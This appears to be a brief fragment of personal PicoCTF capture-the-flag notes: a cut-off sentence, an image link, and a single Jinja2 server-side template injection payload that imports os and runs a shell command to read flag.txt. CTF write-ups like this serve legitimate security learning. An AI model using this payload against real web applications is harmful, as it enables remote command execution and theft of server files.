



To test if there is a


![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305132715.png)


```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```